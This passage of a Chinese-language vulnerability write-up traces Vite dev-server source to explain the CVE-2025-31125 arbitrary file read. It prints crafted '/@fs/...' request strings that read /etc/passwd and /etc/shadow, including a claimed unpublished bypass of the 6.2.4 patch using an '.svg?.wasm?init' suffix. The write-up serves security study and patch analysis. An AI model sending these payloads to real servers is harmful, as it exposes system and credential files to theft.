src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403232929286.png" class="" title="图片引用方法一"><p>这里经过了removeTimestampQuery函数，但是我们最后不是问号所以没事</p><p>接下来是：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlWithoutTrailingQuerySeparators = url.<span class="title function_">replace</span>(</span><br><span class="line">  trailingQuerySeparatorsRE,</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>url还是<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>然后我们要进入一个if语句：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) </span><br></pre></td></tr></table></figure><p>我们要让前三个test都为false才行！</p><p>但是此处inlineRE.test会匹配到！因此vite6.2.4 修补了这个漏洞（CVE-2025-31125）！</p><p>接下来我们跟一遍vite6.2.3：</p><p>我们从if语句处开始分析，此时url为<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这里就匹配不到了，我们就可以往下走了。</p><p>进入下一个if语句：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      ) &#123;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br></pre></td></tr></table></figure><p>匹配到了，进入if语句。进行一次removeImportQuery(url)。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过removeImportQuery后url就变成了<code>/@fs/etc/passwd??inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;/@fs/etc/passwd?import&amp;?inline=1.wasm?init&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span>;</span><br><span class="line"><span class="keyword">const</span> newUrl = url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newUrl); </span><br><span class="line"></span><br><span class="line"><span class="comment">//   /@fs/etc/passwd??inline=1.wasm?init</span></span><br></pre></td></tr></table></figure><p>接下来进入transformRequest</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">transformRequest</span>(environment, url, &#123;</span><br><span class="line">          <span class="attr">html</span>: req.<span class="property">headers</span>.<span class="property">accept</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>),</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>没有对url进行什么操作，直接跟进doTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="title function_">doTransform</span>(environment, url, options, timestamp)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">DevEnvironment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">options</span>: <span class="title class_">TransformOptions</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">timestamp</span>: <span class="built_in">number</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  url = <span class="title function_">removeTimestampQuery</span>(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; pluginContainer &#125; = environment</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// try use cache from url</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> resolved = <span class="variable language_">module</span></span><br><span class="line">    ? <span class="literal">undefined</span></span><br><span class="line">    : ((<span class="keyword">await</span> pluginContainer.<span class="title function_">resolveId</span>(url, <span class="literal">undefined</span>)) ?? <span class="literal">undefined</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// resolve</span></span><br><span class="line">  <span class="keyword">const</span> id = <span class="variable language_">module</span>?.<span class="property">id</span> ?? resolved?.<span class="property">id</span> ?? url</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">module</span> ??= environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// if a different url maps to an existing loaded id,  make sure we relate this url to the id</span></span><br><span class="line">    <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">_ensureEntryFromUrl</span>(url, <span class="literal">undefined</span>, resolved)</span><br><span class="line">    <span class="comment">// try use cache from id</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; depsOptimizer &#125; = environment</span><br><span class="line">  <span class="keyword">if</span> (!depsOptimizer?.<span class="title function_">isOptimizedDepFile</span>(id)) &#123;</span><br><span class="line">    environment.<span class="title function_">_registerRequestProcessing</span>(id, <span class="function">() =&gt;</span> result)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对url进行一次removeTimestampQuery，但是没什么效果。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>跟进loadAndTransform后，继续跟进</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loadResult = <span class="keyword">await</span> pluginContainer.<span class="title function_">load</span>(id)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>直接进入fileToUrl！然后进入fileToDevUrl。</p><p>进入if语句：<code>/@fs/etc/passwd??inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"><span class="keyword">const</span> svgExtRE = <span class="regexp">/\.svg(?:$|\?)/</span></span><br><span class="line"><span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入if语句后进行一次Url的清洗</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file也就等于&#x2F;@fs&#x2F;etc&#x2F;passwd了！然后readFile后赋值为content。最后进行回显！</p><h3 id="未公开POC"><a href="#未公开POC" class="headerlink" title="未公开POC"></a>未公开POC</h3><p>看一下最新的commit，发现多了对于svg的判断。这个poc是可以打6.2.4的。</p><p>我们先看看fileToDevUrl</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> svgExtRE = <span class="regexp">/\.svg(?:$|\?)/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>发现其中不知有inlineRE，还有一个svgExtRE，我们可以通过svg来进行文件读取。</p><p>那么就有这样的poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init</span><br><span class="line"></span><br><span class="line">/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</span><br></pre></td></tr></table></figure><p>我们跟一遍vite6.2.4先。</p><p>由于最末尾没有<code>?</code>之类的，我们直接进入下面的if语句：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>要求rawRE，urlRE，inlineRE均为false才行，自然是可以的。</p><p>那么接下来进入下面的if语句：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>isImportRequest为true，直接进入if语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = removeImportQuery(url)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过removeImportQuery后url变成了<code>/@fs/etc/passwd??meteorkai.svg?.wasm?init</code></p><p>然后进入transformRequest</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">transformRequest</span>(environment, url, &#123;</span><br><span class="line">          <span class="attr">html</span>: req.<span class="property">headers</span>.<span class="property">accept</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>),</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>接着跟进doTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="title function_">doTransform</span>(environment, url, options, timestamp)</span><br></pre></td></tr></table></figure><p>跟进loadAndTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>然后进入load函数</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>进入fileToUrl。再跟进fileToDevUrl。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title 